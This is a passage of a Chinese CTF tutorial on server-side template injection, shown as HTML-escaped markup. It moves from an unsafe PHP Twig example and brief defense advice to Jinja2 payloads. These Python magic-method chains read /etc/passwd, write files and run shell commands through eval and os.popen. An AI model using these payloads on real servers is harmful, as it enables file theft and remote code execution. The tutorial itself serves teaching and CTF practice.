    &lt;span class=&quot;k&quot;&gt;require_once&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;dirname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;__FILE__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;/../lib/Twig/Autoloader.php&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;Twig_Autoloader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;register&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$tw&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Twig_Environment&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Twig_Loader_String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;());&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$output&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$tw&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;render&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;#34;Hello {{username}}&amp;#34;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;#34;username&amp;#34;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;#34;username&amp;#34;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]));&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;// 将用户输入作为模版变量的值
&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;&lt;/span&gt;    &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$output&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;显然这段代码并没有什么问题，即使你想通过 username 参数传递一段 JavaScript 代码给服务端进行渲染，也许你会认为这里可以进行 XSS，但是由于模版引擎一般都默认对渲染的变量值进行编码和转义，所以并不会造成 XSS。&lt;/p&gt;&lt;p&gt;&lt;b&gt;但是，如果渲染的模版内容受到用户的控制，结果就会完全不同。&lt;/b&gt;&lt;/p&gt;&lt;p&gt;修改代码为：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;require_once&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;dirname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;__FILE__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;/../lib/Twig/Autoloader.php&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;Twig_Autoloader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;register&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$tw&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Twig_Environment&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Twig_Loader_String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;());&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$output&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$tw&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;render&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;#34;Hello &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;$_GET[&amp;#39;username&amp;#39;]&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;// 将用户输入作为模版内容的一部分
&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;&lt;/span&gt;    &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$output&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;上面这段代码在构建模版时，拼接了用户输入作为模板的内容，现在如果再向服务端直接传递 JavaScript 代码，用户输入会原样输出，浏览器弹窗，XSS 构建成功。&lt;/p&gt;&lt;p&gt;在 Twig 模板引擎里，{{var}}  除了可以输出传递的变量以外，还能执行一些基本的表达式然后将其结果作为该模板变量的值，例如这里用户输入 username={{2*2}}，则在服务端拼接的模版显示结果就为：&lt;b&gt;Hello 4&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;如何防御SSTI？&lt;/b&gt;&lt;/p&gt;&lt;p&gt;为了防止此类漏洞的存在，应该尽可能加载静态模板文件。&lt;/p&gt;&lt;ul&gt;&lt;li&gt;我们已经确定此功能类似于 require() 函数调用。因此，你也应该防止本地文件包含（LFI）漏洞，不要允许用户控制此类文件或其内容的路径。&lt;/li&gt;&lt;li&gt;如果需要将动态数据传递给模板，不要直接在模板文件中执行，可以使用模板引擎的内置功能来扩展表达式，实现同样的效果。&lt;/li&gt;&lt;/ul&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-5f58e1a2a31dbd533d82bd9dbcbb0bc2_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;640&quot; data-rawheight=&quot;386&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;640&quot; data-original=&quot;https://pic3.zhimg.com/v2-5f58e1a2a31dbd533d82bd9dbcbb0bc2_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-5f58e1a2a31dbd533d82bd9dbcbb0bc2_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;640&quot; data-rawheight=&quot;386&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;640&quot; data-original=&quot;https://pic3.zhimg.com/v2-5f58e1a2a31dbd533d82bd9dbcbb0bc2_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-5f58e1a2a31dbd533d82bd9dbcbb0bc2_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;h2&gt;Flask SSTI漏洞🕳&lt;/h2&gt;&lt;p&gt;在 CTF 中，最常见的也就是 Jinja2 的 SSTI 漏洞了，过滤不严，构造恶意数据提交达到读取flag 或 getshell 的目的。下面以 Python 为例：&lt;/p&gt;&lt;p&gt;Flask SSTI 题的基本思路就是利用 python 中的 &lt;b&gt;魔术方法&lt;/b&gt; 找到自己要用的函数。&lt;/p&gt;&lt;ul&gt;&lt;li&gt;__dict__：保存类实例或对象实例的属性变量键值对字典&lt;/li&gt;&lt;li&gt;__class__：返回调用的参数类型&lt;/li&gt;&lt;li&gt;__mro__：返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。&lt;/li&gt;&lt;li&gt;__bases__：返回类型列表&lt;/li&gt;&lt;li&gt;__subclasses__：返回object的子类&lt;/li&gt;&lt;li&gt;__init__：类的初始化方法&lt;/li&gt;&lt;li&gt;__globals__：函数会以字典类型返回当前位置的全部全局变量 与 func_globals 等价&lt;/li&gt;&lt;/ul&gt;&lt;blockquote&gt;__base__ 和 __mro__ 都是用来寻找基类的。&lt;/blockquote&gt;&lt;p&gt;&lt;b&gt;基本流程&lt;/b&gt;&lt;/p&gt;&lt;p&gt;使用魔术方法进行函数解析，再获取基本类：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;vm&quot;&gt;__class__&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;vm&quot;&gt;__mro__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{}&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;vm&quot;&gt;__class__&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;vm&quot;&gt;__bases__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;vm&quot;&gt;__class__&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;vm&quot;&gt;__bases__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;vm&quot;&gt;__class__&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;vm&quot;&gt;__bases__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;vm&quot;&gt;__class__&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;vm&quot;&gt;__mro__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;//&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;针对&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;jinjia2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;flask为&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;9&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;适用&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;获取基本类后，继续向下获取基本类 object 的子类：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;&lt;span class=&quot;nb&quot;&gt;object&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__subclasses__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;找到重载过的__init__类（在获取初始化属性后，带 wrapper 的说明没有重载，寻找不带 warpper 的）：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;vm&quot;&gt;__class__&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;vm&quot;&gt;__mro__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__subclasses__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;99&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;fm&quot;&gt;__init__&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;slot&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;wrapper&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;__init__&amp;#39;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;of&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;object&amp;#39;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;objects&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;vm&quot;&gt;__class__&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;vm&quot;&gt;__mro__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__subclasses__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;59&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;fm&quot;&gt;__init__&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;unbound&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;method&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;WarningMessage&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;fm&quot;&gt;__init__&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;查看其引用 __builtins__&lt;/p&gt;&lt;p&gt;Python 程序一旦启动，它就会在程序员所写的代码没有运行之前就已经被加载到内存中了,而对于 builtins 却不用导入，它在任何模块都直接可见，所以这里直接调用引用的模块。&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;vm&quot;&gt;__class__&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;vm&quot;&gt;__mro__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__subclasses__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;59&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;fm&quot;&gt;__init__&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;vm&quot;&gt;__globals__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;__builtins__&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这里会返回 dict 类型，寻找 keys 中可用函数，直接调用即可，使用 keys 中的 file 以实现读取文件的功能：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;vm&quot;&gt;__class__&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;vm&quot;&gt;__mro__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__subclasses__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;59&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;fm&quot;&gt;__init__&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;vm&quot;&gt;__globals__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;__builtins__&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;][&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;file&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;](&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;F://GetFlag.txt&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;b&gt;读写文件&lt;/b&gt;&lt;/p&gt;&lt;p&gt;读文件：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;vm&quot;&gt;__class__&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;vm&quot;&gt;__mro__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__subclasses__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;59&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;fm&quot;&gt;__init__&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;vm&quot;&gt;__globals__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;__builtins__&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;][&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;file&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;](&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;/etc/passwd&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;写文件：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;vm&quot;&gt;__class__&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;vm&quot;&gt;__mro__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__subclasses__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;59&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;fm&quot;&gt;__init__&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;vm&quot;&gt;__globals__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;__builtins__&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;][&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;file&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;](&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;/etc/passwd&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;存在的子模块可以通过 .index() 来进行查询，如果存在的话返回索引，直接调用即可。&lt;/p&gt;&lt;p&gt;还有另外的方法：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;vm&quot;&gt;__class__&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__base__&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__subclasses__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;40&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;](&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;/etc/passwd&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;写文件换为 .write() 即可。&lt;/p&gt;&lt;p&gt;&lt;b&gt;命令执行&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;No.1&lt;/b&gt;&lt;/p&gt;&lt;p&gt;利用eval 进行命令执行。&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;vm&quot;&gt;__class__&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;vm&quot;&gt;__mro__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__subclasses__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;59&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;fm&quot;&gt;__init__&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;vm&quot;&gt;__globals__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;__builtins__&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;][&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;eval&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;](&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;__import__(&amp;#34;os&amp;#34;).popen(&amp;#34;whoami&amp;#34;).read()&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;或者。。。&lt;/p&gt;&lt;p&gt;&lt;b&gt;No.2&lt;/b&gt;&lt;/p&gt;&lt;p&gt;利用warnings.catch_warnings 进行命令执行。&lt;/p&gt;&lt;p&gt;首先，查看 warnings.catch_warnings 方法的位置：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;vm&quot;&gt;__class__&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__base__&lt;/span&gt;&lt;span 